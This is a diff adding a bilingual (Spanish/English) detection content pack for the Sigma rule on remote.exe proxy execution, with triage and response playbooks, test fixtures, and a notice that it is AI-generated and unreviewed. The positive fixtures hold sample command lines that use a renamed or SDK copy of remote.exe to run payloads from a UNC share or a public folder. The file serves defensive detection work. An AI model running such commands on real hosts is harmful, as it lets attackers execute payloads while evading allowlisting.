@@ -1,0 +1,137 @@
+{
+  "rule": {
+    "id": "4eddc365-79b4-43ff-a9d7-99422dc34b93",
+    "title": "Use of Remote.exe",
+    "level": "medium",
+    "status": "test",
+    "author": "Christopher Peacock @SecurePeacock, SCYTHE @scythe_io",
+    "path": "windows/process_creation/proc_creation_win_lolbin_remote.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_lolbin_remote.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1127"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó remote.exe, una utilidad de Debugging Tools for Windows (WinDbg) del Windows SDK que puede lanzar comandos y exponerlos en una sesión remota. Fuera de equipos de depuración aprobados, puede indicar un bypass de listas de aplicaciones permitidas (AWL).",
+      "what_it_detects": "Creación de procesos cuyo Image termina en \\remote.exe, o cuyo OriginalFileName es remote.exe. Esto último detecta también copias renombradas del binario.",
+      "why_it_matters": "remote.exe es un binario firmado por Microsoft. En modo servidor (/s) ejecuta un programa local o en una ruta UNC y lo comparte por named pipes. Un atacante puede usarlo para ejecutar payloads mediante una herramienta de desarrollo confiable y eludir AWL (ATT&CK T1127, Trusted Developer Utilities Proxy Execution).",
+      "triage_steps": [
+        "Revise Image: una ruta bajo Windows Kits\\10\\Debuggers es esperable; Users, Temp, ProgramData o un nombre distinto con OriginalFileName remote.exe resulta sospechoso.",
+        "Analice CommandLine: /s indica modo servidor y el programa que lanza; /c indica conexión a otro servidor. Busque rutas UNC, scripts o binarios no estándar.",
+        "Identifique ParentImage y su línea de comandos. Un padre como Office, wscript, mshta, powershell o un servicio web no corresponde a depuración legítima.",
+        "Valide el hash y la firma digital del binario y compárelos con la versión del SDK instalada en el inventario.",
+        "Revise los procesos hijos y los eventos de red del host en un rango de +/- 15 minutos: conexiones SMB, named pipes y accesos a recursos compartidos externos.",
+        "Confirme con el usuario o su responsable si realiza tareas de depuración y si el SDK está aprobado en ese endpoint.",
+        "Busque alertas previas del mismo usuario y host, y ejecuciones de remote.exe en otros equipos."
+      ],
+      "false_positives": [
+        "Instalaciones aprobadas del Windows SDK con Debugging Tools for Windows (WinDbg) usadas por desarrolladores o ingenieros de soporte.",
+        "Sesiones de depuración remota de kernel o de aplicaciones en laboratorios de pruebas.",
+        "Scripts internos de QA o de compilación que usan remote.exe para compartir consolas."
+      ],
+      "response_steps": [
+        "Verifique la legitimidad con el usuario y el equipo de desarrollo antes de actuar.",
+        "Si no está autorizado, aísle el endpoint y termine el proceso remote.exe y sus procesos hijos.",
+        "Recolecte el binario, el payload referenciado en CommandLine y los artefactos del padre para su análisis.",
+        "Bloquee remote.exe mediante AppLocker o WDAC en equipos que no requieran el SDK y elimine las copias renombradas.",
+        "Restablezca las credenciales del usuario si hay indicios de compromiso y documente las excepciones aprobadas."
+      ],
+      "severity_rationale": "El nivel medium es adecuado porque es un binario legítimo de desarrollo con usos válidos, pero su presencia fuera de equipos de depuración es poco común y permite la ejecución por proxy."
+    },
+    "en": {
+      "summary": "remote.exe ran on this host. It is a Debugging Tools for Windows (WinDbg) utility from the Windows SDK that can launch commands and share them in a remote session. Outside approved debugging machines, this may mean someone is bypassing application allowlisting (AWL).",
+      "what_it_detects": "Process creation where Image ends with \\remote.exe or OriginalFileName is remote.exe. The OriginalFileName match also catches renamed copies of the binary.",
+      "why_it_matters": "remote.exe is signed by Microsoft. In server mode (/s) it runs a local or UNC-path program and shares it over named pipes. Attackers can use this trusted developer tool to run payloads and evade AWL (ATT&CK T1127, Trusted Developer Utilities Proxy Execution).",
+      "triage_steps": [
+        "Check Image: a path under Windows Kits\\10\\Debuggers is expected. A path under Users, Temp or ProgramData is suspicious, as is a different file name with OriginalFileName remote.exe.",
+        "Read CommandLine: /s means server mode and names the program it launches, and /c connects to another server. Look for UNC paths, scripts or unusual binaries.",
+        "Identify ParentImage and its command line. Office apps, wscript, mshta, powershell or web services as the parent do not fit normal debugging.",
+        "Check the binary's hash and digital signature against the SDK version recorded in your inventory.",
+        "Review child processes and network events on the host within +/- 15 minutes: SMB connections, named pipes and access to external shares.",
+        "Ask the user or their manager whether they do debugging work and whether the SDK is approved on this endpoint.",
+        "Search for earlier alerts on the same user and host, and for remote.exe runs on other machines."
+      ],
+      "false_positives": [
+        "Approved Windows SDK installs with Debugging Tools for Windows (WinDbg) used by developers or support engineers.",
+        "Remote kernel or application debugging sessions in test labs.",
+        "Internal QA or build scripts that use remote.exe to share consoles."
+      ],
+      "response_steps": [
+        "Confirm with the user and the development team that the activity is legitimate before you act.",
+        "If it is not authorized, isolate the endpoint and terminate remote.exe and its child processes.",
+        "Collect the binary, the payload named in CommandLine and the parent process artifacts for analysis.",
+        "On hosts that do not need the SDK, block remote.exe with AppLocker or WDAC. Remove any renamed copies.",
+        "Reset the user's credentials if you find signs of compromise. Document approved exceptions."
+      ],
+      "severity_rationale": "Medium fits because this is a legitimate developer binary with valid uses, but it is rare outside debugging machines and can run other programs by proxy."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "remote.exe from the SDK Debuggers folder launched in server mode by PowerShell, running a binary from a UNC share",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\remote.exe",
+          "OriginalFileName": "remote.exe",
+          "CommandLine": "remote.exe /s \"\\\\192.0.2.15\\share\\update.exe\" session01",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CurrentDirectory": "C:\\Users\\jperez\\",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "Renamed copy of remote.exe in a user-writable folder, caught by OriginalFileName",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Users\\Public\\svchelper.exe",
+          "OriginalFileName": "remote.exe",
+          "CommandLine": "svchelper.exe /s \"C:\\Users\\Public\\payload.exe\" dbg",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Windows Remote Assistance (msra.exe): a remote-related tool, but neither Image nor OriginalFileName matches remote.exe",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\msra.exe",
+          "OriginalFileName": "msra.exe",
+          "CommandLine": "\"C:\\Windows\\System32\\msra.exe\" /offerRA WS-0207",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "Process whose name contains 'remote' but does not end with \\remote.exe",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0310.andes.example.com",
+          "User": "ANDES\\lgomez",
+          "Image": "C:\\Program Files\\Devolutions\\Remote Desktop Manager\\RemoteDesktopManager.exe",
+          "OriginalFileName": "RemoteDesktopManager.exe",
+          "CommandLine": "\"C:\\Program Files\\Devolutions\\Remote Desktop Manager\\RemoteDesktopManager.exe\"",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
